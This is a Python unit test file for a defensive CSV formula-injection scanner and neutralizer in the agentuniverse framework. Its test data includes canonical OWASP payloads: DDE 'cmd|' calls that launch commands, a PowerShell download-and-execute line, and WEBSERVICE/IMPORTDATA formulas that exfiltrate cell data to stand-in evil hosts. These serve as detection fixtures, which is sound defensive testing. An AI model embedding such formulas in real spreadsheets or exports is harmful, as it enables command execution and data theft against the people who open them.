"""Oracle-driven unit tests for CsvInjectionTool (OWASP CSV Injection)."""

import csv
import io
import os
import random
import re
import time
import unittest
from collections import Counter

from agentuniverse.agent.action.tool.common_tool import csv_injection_tool as csv_injection_module
from agentuniverse.agent.action.tool.common_tool.csv_injection_tool import CsvInjectionTool
from agentuniverse.agent.action.tool.tool_manager import ToolManager
from agentuniverse.base.component.component_enum import ComponentEnum
from agentuniverse.base.config.application_configer.app_configer import AppConfiger
from agentuniverse.base.config.application_configer.application_config_manager import ApplicationConfigManager
from agentuniverse.base.config.component_configer.component_configer import ComponentConfiger
from agentuniverse.base.config.component_configer.configers.tool_configer import ToolConfiger
from agentuniverse.base.config.configer import Configer

YAML_PATH = os.path.join(os.path.dirname(csv_injection_module.__file__), "csv_injection_tool.yaml")

# Canonical OWASP CSV Injection vectors (plus the TAB/CR obfuscated variants
# called out on the same page). Every one of them must scan as high risk.
OWASP_VECTORS = [
    "=cmd|' /C calc'!A0",
    "=cmd|'/C powershell IEX(wget https://example.invalid/x.ps1)'!A0",
    "=SUM(1+9)*cmd|'/C calc'!A0",
    "+cmd|'/C calc'!A0",
    "-2+5+cmd|'/C calc'!A0",
    "@SUM(cmd|'/C calc'!A0)",
    "@cmd|'/C calc'!A0",
    "\t=cmd|'/C calc'!A0",
    "\r=cmd|'/C calc'!A0",
    "=HYPERLINK(\"https://evil.invalid/freemoney\",\"Free Money\")",
    "=WEBSERVICE(\"https://evil.invalid/collect?d=\"&A1&A2)",
    "=IMPORTXML(\"https://evil.invalid/data\",\"//a/@href\")",
    "=IMPORTDATA(\"https://evil.invalid/dump\")",
    "=MSEXCEL|'\\\\web\\\\evil.xlsx'!Sheet1",
]

# Independent oracle re-implementation of the finding-existence rule. It is
# written from the OWASP specification on purpose, not by calling the module.
OBFUS_PREFIX = (
    "\t\r"
    "\u200b\u200c\u200d\u200e\u200f"
    "\u202a\u202b\u202c\u202d\u202e"
    "\u2060\u2066\u2067\u2068\u2069"
    "\ufeff"
)
BIDI = "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069"
FULLWIDTH = {"\uff1d", "\uff0b", "\uff0d", "\uff20"}
ORACLE_NUMERIC = re.compile(r"[+-]?(\d+(\.\d*)?|\.\d+)([eE][+-]?\d+)?")
ORACLE_FUNC_SHAPE = re.compile(r"^[A-Za-z_]\w*\s*\(")


def oracle_a1(col):
    """Independently convert a 0-based column index to A1 letters."""
    letters = ""
    remaining = col
    while remaining >= 0:
        letters = chr(ord("A") + remaining % 26) + letters
        remaining = remaining // 26 - 1
    return letters


def oracle_has_finding(value):
    """Independently decide whether a cell must produce a scan finding."""
    stripped = value.lstrip(OBFUS_PREFIX)
    prefix = value[: len(value) - len(stripped)]
    lead = stripped[:1]
    if lead in "=+-@":
        body = stripped[1:]
        if not body:
            return False
        if lead in "+-" and ORACLE_NUMERIC.fullmatch(stripped):
            return False
        if ORACLE_FUNC_SHAPE.match(body) or body[:1].isalpha():
            return True
        if any(op in body for op in "+-*/^"):
            return True
        return lead == "="
    if lead == "'" and len(stripped) > 1:
        return True
    if any(char in BIDI for char in prefix):
        return True
    return lead in FULLWIDTH


def oracle_needs_prefix(value):
    """Independent OWASP remediation rule: which cells get an apostrophe."""
    return bool(value) and value[0] in "=+-@\t\r"


CELL_POOL = [
    "", "hello", "world example", "42", "-2", "+3.14", "-.5e8", "-1e-5", "+2e+10", "3,000 built-in",
    "plain, comma", 'quote " inside', "line\nbreak", "tab\tinside", "\rCR inside",
    "café über 中文", "emoji 🚀 payload", "%50", "% growth", "'=escaped", "'text'",
    "=cmd|' /C calc'!A0", "=HYPERLINK(\"https://evil.invalid\",\"x\")",
    "=WEBSERVICE(\"https://evil.invalid\")", "+cmd|'/C calc'!A0",
    "-2+5+cmd|'/C calc'!A0", "@SUM(cmd|'/C calc'!A0)", "\t=cmd|'x'!A0",
    "\r=cmd|'x'!A0", "=A1+B1", "=SUM(1,2)", "-2+5+3", "@SUM(1,2)", "=2",
    "-", "+", "=", "@", "\uff1d	cmd lookalike", "\uff20SUM(1,2)",
    "\u202edisplay me", "\u202e", "\u200bzero width", "\tleading tab text",
    "trailing\t", "-abc", "+A1", "x" * 300, "=1+HYPERLINK(\"https://evil.invalid\")",
]

DIALECT_CASES = [
    {"dialect": "excel", "writer": {"dialect": "excel"}},
    {"dialect": "excel-tab", "writer": {"dialect": "excel-tab"}},
    {"dialect": "excel", "delimiter": ";", "writer": {"delimiter": ";", "quotechar": '"'}},
]


def build_seed_csv(seed):
    """Deterministically build one real-world-ish CSV and its dialect args."""
    rng = random.Random(seed)
    case = DIALECT_CASES[seed % len(DIALECT_CASES)]
    rows = [[rng.choice(CELL_POOL) for _ in range(rng.randint(2, 6))] for _ in range(rng.randint(3, 8))]
    buffer = io.StringIO()
    csv.writer(buffer, **case["writer"]).writerows(rows)
    text = buffer.getvalue()
    scan_args = {"dialect": case["dialect"]}
    if "delimiter" in case:
        scan_args["delimiter"] = case["delimiter"]
    reader_kwargs = dict(case["writer"])
    return text, rows, scan_args, reader_kwargs


class OwaspVectorOracleTest(unittest.TestCase):
    """Canonical OWASP CSV Injection vectors must all classify as high risk."""

    def test_all_owasp_vectors_are_high(self):
        """Every canonical vector (incl. TAB/CR variants) scans as risk=high."""
        buffer = io.StringIO()
        rows = [["row", vector] for vector in OWASP_VECTORS]
        csv.writer(buffer).writerows(rows)
        result = CsvInjectionTool().execute(mode="scan", csv_text=buffer.getvalue())
        self.assertEqual(result["status"], "success")
        self.assertEqual(len(result["findings"]), len(OWASP_VECTORS))
        for finding in result["findings"]:
            self.assertEqual(finding["risk"], "high", finding)
        self.assertEqual(result["summary"]["risk_counts"]["high"], len(OWASP_VECTORS))

    def test_owasp_vector_codes_and_reasons(self):
        """High findings carry a precise code and an actionable reason."""
        buffer = io.StringIO()
        csv.writer(buffer).writerows(
            [["=cmd|' /C calc'!A0"], ["=HYPERLINK(\"https://e.invalid\",\"x\")"], ["=WEBSERVICE(\"https://e.invalid\")"]]
        )
        result = CsvInjectionTool().execute(mode="scan", csv_text=buffer.getvalue())
        codes = [finding["code"] for finding in result["findings"]]
        self.assertEqual(codes, ["DDE", "HYPERLINK", "WEBSERVICE"])
        for finding in result["findings"]:
            self.assertTrue(finding["reason"])

    def test_explain_confirms_payloads(self):
        """Explain mode flags each canonical vector as an executable payload."""
        tool = CsvInjectionTool()
        for vector in OWASP_VECTORS[:8]:
            explained = tool.execute(mode="explain", cell_value=vector)
            self.assertEqual(explained["status"], "success", vector)
            self.assertTrue(explained["is_payload"], vector)
            self.assertIn(explained["risk"], {"high", "medium"})
            self.assertTrue(explained["what_spreadsheet_would_do"])
            self.assertEqual(explained["recommended_neutralization"], "'" + vector)


class CsvModuleParityOracleTest(unittest.TestCase):
    """Scan/neutralize must agree exactly with csv.reader enumeration."""

    def test_400_seeded_csvs_coordinate_parity(self):
        """Finding coordinates equal an independent csv.reader enumeration."""
        tool = CsvInjectionTool()
        for seed in range(400):
            text, _, scan_args, reader_kwargs = build_seed_csv(seed)
            result = tool.execute(mode="scan", csv_text=text, **scan_args)
            self.assertEqual(result["status"], "success", f"seed={seed}")
            rows = list(csv.reader(io.StringIO(text), **reader_kwargs))
            expected = {
                (row_index, col_index)
                for row_index, row in enumerate(rows)
                for col_index, value in enumerate(row)
                if oracle_has_finding(value)
            }
            actual = {(finding["row"], finding["col"]) for finding in result["findings"]}
            self.assertEqual(actual, expected, f"seed={seed}")
            self.assertEqual(result["summary"]["cells_scanned"], sum(len(row) for row in rows), f"seed={seed}")
            self.assertEqual(result["summary"]["rows_scanned"], len(rows), f"seed={seed}")
            for finding in result["findings"]:
                self.assertEqual(
                    finding["cell_ref"], f"{oracle_a1(finding['col'])}{finding['row'] + 1}", f"seed={seed}"
                )

    def test_embedded_newline_cells_do_not_advance_rows(self):
        """A quoted embedded newline stays inside one cell and one finding."""
        text = 'name,note\n"line1\nline2","=cmd|\'x\'!A0"\nplain,-2\n'
        result = CsvInjectionTool().execute(mode="scan", csv_text=text)
        self.assertEqual(result["summary"]["rows_scanned"], 3)
        self.assertEqual(result["summary"]["cells_scanned"], 6)
        self.assertEqual([(f["row"], f["col"]) for f in result["findings"]], [(1, 1)])

    def test_400_seeded_csvs_neutralize_round_trip(self):
        """Neutralized CSV reparses to original rows with only trigger cells prefixed."""
        tool = CsvInjectionTool()
        for seed in range(400):
            text, _, scan_args, reader_kwargs = build_seed_csv(seed)
            result = tool.execute(mode="neutralize", csv_text=text, **scan_args)
            self.assertEqual(result["status"], "success", f"seed={seed}")
            self.assertTrue(result["dialect_preserved"], f"seed={seed}")
            original_rows = list(csv.reader(io.StringIO(text), **reader_kwargs))
            expected_rows = [
                ["'" + value if oracle_needs_prefix(value) else value for value in row] for row in original_rows
            ]
            reparsed = list(csv.reader(io.StringIO(result["safe_csv"]), **reader_kwargs))
            self.assertEqual(reparsed, expected_rows, f"seed={seed}")
            expected_changed = sum(1 for row in original_rows for value in row if oracle_needs_prefix(value))
            self.assertEqual(result["changed_count"], expected_changed, f"seed={seed}")

    def test_neutralize_sniff_agreement(self):
        """Sniffed delimiters agree between input and neutralized output."""
        texts = [
            "a,b\nx,=cmd|'x'!A0\ny,-2\n",
            "a\tb\nx\t=cmd|'x'!A0\ny\t-2\n",
            "a;b\nx;=cmd|'x'!A0\ny;-2\n",
        ]
        args = [
            {"dialect": "excel"},
            {"dialect": "excel-tab"},
            {"dialect": "excel", "delimiter": ";"},
        ]
        for text, kwargs in zip(texts, args):
            result = CsvInjectionTool().execute(mode="neutralize", csv_text=text, **kwargs)
            self.assertTrue(result["dialect_preserved"])
            try:
                before = csv.Sniffer().sniff(text).delimiter
                after = csv.Sniffer().sniff(result["safe_csv"]).delimiter
            except csv.Error:  # pragma: no cover - sniffer refuses tiny samples
                continue
            self.assertEqual(before, after)

    def test_neutralize_preserves_unchanged_cell_values(self):
        """Unchanged cells (embedded quotes/newlines/tabs) survive byte-for-byte."""
        tricky = 'plain,"multi\nline, with ""quotes"" and\ttab",keep\n=cmd|\'x\'!A0,-2,\'\'\n'
        result = CsvInjectionTool().execute(mode="neutralize", csv_text=tricky)
        rows = list(csv.reader(io.StringIO(result["safe_csv"])))
        self.assertEqual(rows[0][0], "plain")
        self.assertEqual(rows[0][1], 'multi\nline, with "quotes" and\ttab')
        self.assertEqual(rows[0][2], "keep")
        self.assertEqual(rows[1][0], "'=cmd|'x'!A0")
        self.assertEqual(rows[1][1], "'-2")
        self.assertEqual(rows[1][2], "''")


class DeterminismOracleTest(unittest.TestCase):
    """Identical inputs must yield identical findings, order-independent."""

    def test_same_input_identical_output(self):
        """Scanning the same file twice returns deep-equal results."""
        text, _, scan_args, _ = build_seed_csv(123)
        tool = CsvInjectionTool()
        first = tool.execute(mode="scan", csv_text=text, **scan_args)
        second = tool.execute(mode="scan", csv_text=text, **scan_args)
        self.assertEqual(first, second)

    def test_shuffled_rows_identical_findings(self):
        """Row order shuffling permutes coordinates but not findings."""
        rng = random.Random(7)
        rows = [["h1", "h2", "h3"]] + [[rng.choice(CELL_POOL) for _ in range(3)] for _ in range(40)]
        shuffled = [rows[0]] + rng.sample(rows[1:], len(rows) - 1)

        def serialize(row_set):
            buffer = io.StringIO()
            csv.writer(buffer).writerows(row_set)
            return buffer.getvalue()

        tool = CsvInjectionTool()
        base = tool.execute(mode="scan", csv_text=serialize(rows))
        mixed = tool.execute(mode="scan", csv_text=serialize(shuffled))
        signature = lambda scan: Counter(
            (finding["col"], finding["code"], finding["risk"], finding["formula_snippet"]) for finding in scan["findings"]
        )
        self.assertEqual(signature(base), signature(mixed))
        self.assertEqual(base["summary"]["risk_counts"], mixed["summary"]["risk_counts"])


class PathologicalInputTest(unittest.TestCase):
    """Bounded runtime on large cell counts and oversized single cells."""

    def test_100k_cells_under_2s(self):
        """Scanning 100,000 cells completes within two seconds."""
        rng = random.Random(42)
        rows = [
            [rng.choice(CELL_POOL) for _ in range(50)] for _ in range(2000)
        ]
        buffer = io.StringIO()
        csv.writer(buffer).writerows(rows)
        text = buffer.getvalue()
        tool = CsvInjectionTool()
        started = time.perf_counter()
        result = tool.execute(mode="scan", csv_text=text)
        elapsed = time.perf_counter() - started
        self.assertEqual(result["status"], "success")
        self.assertEqual(result["summary"]["cells_scanned"], 100_000)
        self.assertLess(elapsed, 2.0, f"scan took {elapsed:.2f}s")

    def test_1mb_single_cell_bounded(self):
        """A single 1 MB cell parses, classifies, and truncates its snippet."""
        huge = "=cmd|" + "A" * (1_048_576 - 5)
        text = 'h1,h2\n"' + huge + '",x\n'
        tool = CsvInjectionTool()
        started = time.perf_counter()
        result = tool.execute(mode="scan", csv_text=text)
        elapsed = time.perf_counter() - started
        self.assertEqual(result["status"], "success")
        self.assertEqual(result["summary"]["rows_scanned"], 2)
        self.assertEqual(len(result["findings"]), 1)
        finding = result["findings"][0]
        self.assertEqual(finding["risk"], "high")
        self.assertEqual(len(finding["formula_snippet"]), 83)
        self.assertLess(elapsed, 5.0, f"scan took {elapsed:.2f}s")
        neutralized = tool.execute(mode="neutralize", csv_text=text)
        self.assertTrue(neutralized["dialect_preserved"])
        self.assertLess(len(neutralized["changed_cells"][0]["after"]), 100)


class ClassificationDetailTest(unittest.TestCase):
    """Risk tiers, exclusions, A1 notation, summaries, and header weighting."""

    def setUp(self):
        """Share one tool instance across the classification checks."""
        self.tool = CsvInjectionTool()

    def scan(self, text, **kwargs):
        """Scan helper returning the findings list."""
        result = self.tool.execute(mode="scan", csv_text=text, **kwargs)
        self.assertEqual(result["status"], "success")
        return result

    def test_medium_tier_shapes(self):
        """Potential formulas, obfuscation, and quote-escapes scan as medium."""
        buffer = io.StringIO()
        csv.writer(buffer).writerows(
            [["a", "b", "c", "d", "e"], ["=A1+B1", "\t=SUM(1,2)", "'''escaped'", "-abc", "+A1"]]
        )
        result = self.scan(buffer.getvalue())
        risks = {(f["row"], f["col"]): f for f in result["findings"]}
        self.assertEqual(risks[(1, 0)]["risk"], "medium")
        self.assertEqual(risks[(1, 1)]["risk"], "medium")
        self.assertIn("Obfuscated", risks[(1, 1)]["reason"])
        self.assertEqual(risks[(1, 2)]["code"], "QUOTE_ESCAPED")
        self.assertEqual(risks[(1, 3)]["risk"], "medium")
        self.assertEqual(risks[(1, 4)]["risk"], "medium")

    def test_percent_and_numeric_exclusions(self):
        """%-prefixed cells and pure numerics are not flagged in scan."""
        result = self.scan('a,b,c\n%50,-2,+3.14\n')
        self.assertEqual(result["findings"], [])
        notes = " ".join(result["summary"]["notes"])
        self.assertIn("%", notes)
        self.assertIn("OWASP", notes)

    def test_numeric_scientific_notation_exclusion(self):
        """Pure numerics with a signed exponent are not flagged as formulas.

        Regression: "-1e5" was unflagged while "-1e-5"/"+2e+10"/"-.5e+8" were
        flagged medium FORMULA_LIKE because the exponent's sign matched the
        arithmetic-operator rule, contradicting the documented numeric
        exclusion and float() parseability.
        """
        row = ",".join(["-1e-5", "+2e+10", "-.5e+8", "-3E-2", "-1e5", "-2", "+3.14", "-.5e8"])
        result = self.scan(f"a\n{row}\n")
        self.assertEqual(result["findings"], [])
        explained = self.tool.execute(mode="explain", cell_value="-1e-5")
        self.assertEqual(explained["risk"], "none")
        self.assertFalse(explained["is_payload"])
        # Real formulas still flagged, and neutralize stays defensively strict.
        still_flagged = self.scan("a,b\n-2+5,=2\n")
        self.assertEqual([f["risk"] for f in still_flagged["findings"]], ["medium", "medium"])
        neutralized = self.tool.execute(mode="neutralize", csv_text="a\n-1e-5\n")
        self.assertEqual(neutralized["changed_count"], 1)
        self.assertEqual(neutralized["changed_cells"][0]["after"], "'-1e-5")

    def test_evidence_echo_bounded_everywhere(self):
        """Findings/explain evidence never echoes unbounded cell content.

        Regression: a 50k-char bidi prefix made scan's payload_prefix and
        explain's trigger/control_escaped grow to 300k+ chars, and a 1 MB
        formula echoed fully in decoded_variants and
        recommended_neutralization.
        """
        cell = "\u202e" * 50_000 + "=cmd|'x'!A0"
        buffer = io.StringIO()
        csv.writer(buffer).writerows([["h"], [cell]])
        result = self.scan(buffer.getvalue())
        finding = result["findings"][0]
        self.assertEqual(finding["risk"], "high")
        self.assertLessEqual(len(finding["payload_prefix"]), 100)
        self.assertIn("...", finding["payload_prefix"])
        self.assertLessEqual(len(finding["formula_snippet"]), self.tool.max_snippet + 3)
        explained = self.tool.execute(mode="explain", cell_value=cell)
        self.assertLessEqual(len(explained["trigger"]), 100)
        for variant in explained["decoded_variants"].values():
            self.assertLessEqual(len(variant), self.tool.max_snippet + 3, variant[:40])
        big = "=" + "A" * 100_000
        explained = self.tool.execute(mode="explain", cell_value=big)
        self.assertLessEqual(len(explained["recommended_neutralization"]), self.tool.max_snippet + 3)
        self.assertLessEqual(len(explained["decoded_variants"]["leading_whitespace_stripped"]), self.tool.max_snippet + 3)
        self.assertLessEqual(len(explained["decoded_variants"]["control_escaped"]), self.tool.max_snippet + 3)

    def test_header_keyword_token_boundaries(self):
        """Header keywords match whole tokens, not substrings.

        Regression: "secretary"/"author"/"tokenizer" were rated high via the
        substrings secret/auth/token, and "email" double-matched email+mail.
        """
        text = "secretary,author,tokenizer,email,password_reset,credit_card_number\n1,2,3,4,5,6\n"
        result = self.tool.execute(mode="headers", csv_text=text)
        self.assertEqual(result["status"], "success")
        by_name = {header["name"]: header for header in result["headers"]}
        for name in ("secretary", "author", "tokenizer"):
            self.assertEqual(by_name[name]["sensitivity"], "low", name)
            self.assertEqual(by_name[name]["matched_keywords"], [], name)
        self.assertEqual(by_name["email"]["sensitivity"], "medium")
        self.assertEqual(by_name["email"]["matched_keywords"], ["email"])
        self.assertEqual(by_name["password_reset"]["sensitivity"], "high")
        self.assertEqual(by_name["credit_card_number"]["sensitivity"], "medium")

    def test_info_tier_homoglyph_and_rtl(self):
        """Fullwidth homoglyphs and RTL overrides surface at info level."""
        text = "\uff1dlooks-like-equals,\u202ereversed,@SUM(1,2)\n"
        result = self.scan(text)
        by_col = {f["col"]: f for f in result["findings"]}
        self.assertEqual(by_col[0]["risk"], "info")
        self.assertEqual(by_col[0]["code"], "HOMOGLYPH")
        self.assertEqual(by_col[1]["risk"], "info")
        self.assertEqual(by_col[1]["code"], "RTL_OVERRIDE")
        self.assertEqual(by_col[2]["risk"], "high")
        self.assertEqual(by_col[2]["code"], "AT_FUNCTION")

    def test_a1_notation_multi_letter_columns(self):
        """Column 27 maps to AB in A1 notation, including beyond Z."""
        header = ",".join(f"h{i}" for i in range(30))
        payload_row = ",".join("=cmd|'x'!A0" if i == 27 else "x" for i in range(30))
        result = self.scan(f"{header}\n{payload_row}\n")
        self.assertEqual(len(result["findings"]), 1)
        self.assertEqual(result["findings"][0]["cell_ref"], "AB2")

    def test_summary_structure_and_sensitive_headers(self):
        """Summary counts, per-column stats, and sensitive header weighting."""
        buffer = io.StringIO()
        csv.writer(buffer).writerows(
            [
                ["password", "email", "name", "note"],
                ["pw", "a@b.invalid", "x", "=cmd|' /C calc'!A0"],
                ["pw2", "c@d.invalid", "y", "=SUM(1,2)"],
            ]
        )
        result = self.scan(buffer.getvalue())
        summary = result["summary"]
        self.assertEqual(summary["cells_scanned"], 12)
        self.assertEqual(summary["risk_counts"], {"high": 1, "medium": 1, "info": 0})
        self.assertEqual(summary["unique_payloads"], 1)
        note_column = next(entry for entry in summary["per_column"] if entry["col"] == 3)
        self.assertEqual(note_column["column"], "D")
        self.assertEqual(note_column["findings"], 2)
        involved = summary["headers_involved"]
        self.assertEqual(len(involved), 1)
        self.assertEqual(involved[0]["header"], "note")
        self.assertEqual(involved[0]["max_risk"], "high")

    def test_headers_mode_ranks_sensitive_columns(self):
        """Headers mode prioritizes password/token/secret/iban/email names."""
        text = "name,amount,password,email,iban\na,b,c,d,e\n"
        result = self.tool.execute(mode="headers", csv_text=text)
        self.assertEqual(result["status"], "success")
        sensitivities = [header["sensitivity"] for header in result["headers"]]
        self.assertEqual(sensitivities, ["high", "medium", "medium", "low", "low"])
        self.assertEqual(result["headers"][0]["name"], "password")

    def test_explain_benign_cell(self):
        """Explain reports a literal-text verdict for ordinary values."""
        explained = self.tool.execute(mode="explain", cell_value="%50 off")
        self.assertFalse(explained["is_payload"])
        self.assertEqual(explained["risk"], "none")
        self.assertIsNone(explained["recommended_neutralization"])
        self.assertIn("literal text", explained["what_spreadsheet_would_do"])

    def test_explain_decoded_variants(self):
        """Explain exposes control-escaped and whitespace-stripped variants."""
        explained = self.tool.execute(mode="explain", cell_value="\t\u202e=cmd|'x'!A0")
        variants = explained["decoded_variants"]
        self.assertEqual(variants["leading_whitespace_stripped"], "=cmd|'x'!A0")
        self.assertTrue(variants["control_escaped"].startswith("\\t\\u202e="))
        self.assertTrue(explained["is_payload"])

    def test_neutralize_changes_and_escapes(self):
        """Neutralize records changed cells and leaves escapes untouched."""
        text = "a,b\n=cmd|'x'!A0,'already\n"
        result = self.tool.execute(mode="neutralize", csv_text=text)
        self.assertTrue(result["dialect_preserved"])
        self.assertEqual(result["changed_count"], 1)
        change = result["changed_cells"][0]
        self.assertEqual((change["row"], change["col"]), (1, 0))
        self.assertEqual(change["before"], "=cmd|'x'!A0")
        self.assertEqual(change["after"], "'=cmd|'x'!A0")
        self.assertIn("'already", result["safe_csv"].replace('"', ""))

    def test_findings_cap_truncation(self):
        """The findings cap truncates output while summary counts stay exact."""
        rows = [["=cmd|'x'!A0", "=A1"] for _ in range(10)]
        buffer = io.StringIO()
        csv.writer(buffer).writerows(rows)
        result = CsvInjectionTool(max_findings=5).execute(mode="scan", csv_text=buffer.getvalue())
        self.assertEqual(len(result["findings"]), 5)
        self.assertTrue(result["summary"]["findings_truncated"])
        self.assertEqual(result["summary"]["risk_counts"]["high"], 10)

    def test_tab_semicolon_dialect_options(self):
        """Excel-tab and semicolon dialects scan their intended columns."""
        tab_text = "a\tb\nx\t=cmd|'x'!A0\n"
        result = self.scan(tab_text, dialect="excel-tab")
        self.assertEqual([(f["row"], f["col"]) for f in result["findings"]], [(1, 1)])
        semi_text = "a;b\n=cmd|'x'!A0;x\n"
        result = self.scan(semi_text, dialect="excel", delimiter=";")
        self.assertEqual([(f["row"], f["col"]) for f in result["findings"]], [(1, 0)])

    def test_empty_input(self):
        """Empty CSV text scans and neutralizes to empty success results."""
        scan = self.tool.execute(mode="scan", csv_text="")
        self.assertEqual(scan["summary"]["cells_scanned"], 0)
        self.assertEqual(scan["findings"], [])
        neutral = self.tool.execute(mode="neutralize", csv_text="")
        self.assertEqual(neutral["safe_csv"], "")
        self.assertTrue(neutral["dialect_preserved"])


class ValidationTest(unittest.TestCase):
    """Strict argument validation returns structured errors."""

    def setUp(self):
        """Share one tool instance across the validation checks."""
        self.tool = CsvInjectionTool()

    def error(self, config=None, **kwargs):
        """Execute helper expecting a structured error result."""
        result = CsvInjectionTool(**(config or {})).execute(**kwargs)
        self.assertEqual(result["status"], "error")
        self.assertIn("error", result)
        return result

    def test_invalid_mode(self):
        """Unknown or non-string modes are rejected."""
        self.error(mode="frobnicate", csv_text="a\n")
        self.error(mode=123)

    def test_non_string_csv_text(self):
        """csv_text must be a string and bounded by max_csv_chars."""
        self.error(mode="scan", csv_text=None)
        self.error(mode="scan", csv_text=["a"])
        self.error(config={"max_csv_chars": 20}, mode="scan", csv_text="a" * 21)

    def test_invalid_dialect_options(self):
        """Dialect, delimiter, and quotechar are strictly validated."""
        self.error(mode="scan", csv_text="a\n", dialect="access")
        self.error(mode="scan", csv_text="a\n", dialect=5)
        self.error(mode="scan", csv_text="a\n", delimiter=";;")
        self.error(mode="scan", csv_text="a\n", delimiter="\n")
        self.error(mode="scan", csv_text="a\n", delimiter=";", quotechar=";")
        self.error(mode="scan", csv_text="a\n", quotechar="ab")

    def test_invalid_explain_input(self):
        """Explain requires a string cell_value within bounds."""
        self.error(mode="explain")
        self.error(mode="explain", cell_value=42)

    def test_invalid_has_header_and_config(self):
        """has_header must be boolean and size attributes positive ints."""
        self.error(mode="scan", csv_text="a\n", has_header="yes")
        self.error(config={"max_cells": 0}, mode="scan", csv_text="a\n")
        self.error(config={"max_snippet": 0}, mode="scan", csv_text="a\n")

    def test_cell_cap_enforced(self):
        """Inputs above max_cells fail fast with a clear message."""
        text = ",".join(["x"] * 11) + "\n"
        result = self.error(config={"max_cells": 5}, mode="scan", csv_text=text)
        self.assertIn("max_cells", result["error"])


class CsvInjectionRegistrationTest(unittest.TestCase):
    """Unit tests for registering the shipped csv_injection_tool.yaml."""

    def setUp(self):
        """Load the shipped yaml config and snapshot the app configer state."""
        self.config = Configer(path=os.path.abspath(YAML_PATH)).load()
        try:
            self.previous = ApplicationConfigManager().app_configer
        except ValueError:
            self.previous = None

    def tearDown(self):
        """Restore the app configer snapshot taken in setUp."""
        ApplicationConfigManager().app_configer = self.previous

    def test_schema(self):
        """Verify the shipped yaml resolves to a tool component with CsvInjectionTool."""
        component = ComponentConfiger().load_by_configer(self.config)
        self.assertEqual(component.get_component_config_type(), ComponentEnum.TOOL.value)
        self.assertEqual(component.metadata_class, "CsvInjectionTool")

    def test_manager(self):
        """Verify CsvInjectionTool is resolvable and configured via ToolManager."""
        configer = ToolConfiger().load_by_configer(self.config)
        app = AppConfiger()
        app.tool_configer_map = {configer.name: configer}
        ApplicationConfigManager().app_configer = app
        tool = ToolManager().get_instance_obj(configer.name)
        self.assertIsInstance(tool, CsvInjectionTool)
        self.assertEqual(tool.input_keys, ["mode", "csv_text"])


if __name__ == "__main__":
    unittest.main()
